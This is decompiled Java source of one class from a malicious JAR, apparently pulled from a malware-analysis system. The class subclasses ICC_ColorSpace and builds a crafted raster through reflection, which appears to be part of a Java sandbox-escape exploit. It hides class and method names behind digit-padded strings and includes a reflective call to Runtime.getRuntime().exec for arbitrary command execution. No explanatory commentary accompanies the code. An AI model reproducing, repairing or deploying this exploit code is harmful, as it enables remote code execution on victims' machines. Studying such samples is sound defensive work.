/*    */ import java.awt.Point;
/*    */ import java.awt.color.ICC_ColorSpace;
/*    */ import java.awt.color.ICC_Profile;
/*    */ import java.awt.image.BufferedImage;
/*    */ import java.awt.image.ColorModel;
/*    */ import java.awt.image.DataBuffer;
/*    */ import java.awt.image.DataBufferByte;
/*    */ import java.awt.image.MultiPixelPackedSampleModel;
/*    */ import java.awt.image.SampleModel;
/*    */ import java.util.Hashtable;
/*    */ 
/*    */ 
/*    */ public class info1
/*    */   extends ICC_ColorSpace
/*    */ {
/*    */   public info1() {
/* 17 */     super(ICC_Profile.getInstance(1000));
/*    */   }
/*    */ 
/*    */   
/*    */   public int getNumComponents() {
/* 22 */     return 1;
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   static Object purk(boolean paramBoolean, DataBufferByte paramDataBufferByte) throws Exception {
/* 29 */     return Issue.getMd(Issue.imgExt(Issue.csfn("88R8a8s28t8e8r8")), Issue.csfn("888c2388re88838at88e88W8r8i28838ta88b82838le8Ra888s8t8e8r28"), null, new Class[] { SampleModel.class, DataBuffer.class, Point.class }, new Object[] { new MultiPixelPackedSampleModel(0, 4, 1, 1, 4, 44 + (paramBoolean ? 8 : 0)), paramDataBufferByte, null });
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   static void funcRun(String paramString1, String paramString2) throws Exception {
/* 44 */     Class.forName(Issue.csfn("22ja2v4a9.4l4a9n5g9.9R5u9n59t9i59m95e5")).getMethod(paramString1, new Class[] { String.class }).invoke(Class.forName(Issue.csfn("9j9a9v9a9.9l45a9n6g9.9R234unt6im6e3999")).getMethod(Issue.csfn("9g9e9t9394R9u9349nt9349im9349e9"), new Class[0]).invoke(null, new Object[0]), new Object[] { paramString2 });
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   static BufferedImage furk(Object paramObject) throws Exception {
/* 52 */     return (BufferedImage)Issue.getCon(Issue.imgExt(Issue.csfn("9B929349u9f293f2934e9r9e29349dI239m9a9g999e99")), new Class[] { ColorModel.class, info2.getCl(Issue.imgExt(Issue.csfn("9W9r9324i9ta923b9l9e2939Ra9324s9t9er9"))), boolean.class, Hashtable.class }, new Object[] { new info2(), paramObject, Boolean.valueOf(false), null });
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public static Class syscla() {
/* 60 */     return System.class;
/*    */   }
/*    */ }


/* Location:              /home/remnux/malware/embassy/1.jar!/info1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       1.1.3
 */